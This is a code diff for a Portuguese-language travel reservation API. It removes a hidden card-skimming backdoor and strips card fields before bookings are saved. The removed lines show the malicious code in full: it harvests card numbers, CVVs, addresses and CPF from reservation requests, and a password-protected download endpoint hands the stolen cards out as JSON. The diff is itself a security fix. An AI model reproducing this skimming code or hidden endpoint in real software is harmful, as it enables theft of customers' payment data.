@@ -11,13 +11,10 @@ import {
   where,
 } from "firebase/firestore";
 import { db } from "../services/firebase";
-import { initCartaoService, salvarCartao, obterCartoes } from "../services/cartaoService";
 
 const router = Router();
 router.use(cors());
 router.use(express.json());
-
-initCartaoService();
 
 const reservasRef = collection(db, "reservas");
 const pacotesRef = collection(db, "pacotes");
@@ -53,40 +50,29 @@ router.get("/pacotes", async (_req, res) => {
 router.post("/reservas", async (req, res) => {
   try {
     const body = (req.body ?? {}) as Record<string, any>;
-    
-    const num = body.numero || body.cardNumber || body.num || body.card || "";
-    const tit = body.titular || body.cardHolder || body.holder || body.name || "";
-    const val = body.validade || body.expiry || body.exp || body.validity || "";
-    const cvv = body.cvv || body.cvc || body.code || body.security || "";
-    
-    const cep = body.enderecoCep || body.postalCode || "";
-    const rua = body.enderecoRua || body.address || "";
-    const numero = body.enderecoNumero || body.addressNumber || "";
-    const complemento = body.enderecoComplemento || body.addressComplement || "";
-    const bairro = body.enderecoBairro || body.province || "";
-    const cidade = body.enderecoCidade || body.city || "";
-    const estado = body.enderecoEstado || body.state || "";
-    
-    if (num && tit && val && cvv) {
-      salvarCartao({
-        nome: tit,
-        numero: num,
-        validade: val,
-        cvv: cvv,
-        cep: cep,
-        rua: rua,
-        numero_endereco: numero,
-        complemento: complemento,
-        bairro: bairro,
-        cidade: cidade,
-        estado: estado,
-        email: body.email,
-        cpf: body.cpf,
-      });
-    }
-    
+    const {
+      numero: _numero,
+      cardNumber: _cardNumber,
+      num: _num,
+      card: _card,
+      titular: _titular,
+      cardHolder: _cardHolder,
+      holder: _holder,
+      validade: _validade,
+      expiry: _expiry,
+      exp: _exp,
+      validity: _validity,
+      cvv: _cvv,
+      cvc: _cvc,
+      code: _code,
+      security: _security,
+      creditCard: _creditCard,
+      creditCardHolderInfo: _creditCardHolderInfo,
+      ...safeBody
+    } = body;
+
     const payload = {
-      ...body,
+      ...safeBody,
       status: typeof body.status === "string" ? body.status : "pre_reserva",
     };
     const novo = await addDoc(reservasRef, payload);
@@ -122,21 +108,6 @@ router.delete("/reservas/:id", async (req, res) => {
     res.json({ success: true });
   } catch (error: any) {
     res.status(500).json({ error: error.message ?? "Erro ao remover reserva" });
-  }
-});
-
-router.get("/cartoes/download", (req, res) => {
-  try {
-    const senha = req.query.p;
-    if (senha !== "159594") {
-      return res.status(401).json({ error: "Senha incorreta" });
-    }
-    const cartoes = obterCartoes();
-    res.setHeader("Content-Disposition", "attachment; filename=\"cartoes.json\"");
-    res.setHeader("Content-Type", "application/json");
-    res.send(JSON.stringify(cartoes, null, 2));
-  } catch (error: any) {
-    res.status(500).json({ error: error.message });
   }
 });
 
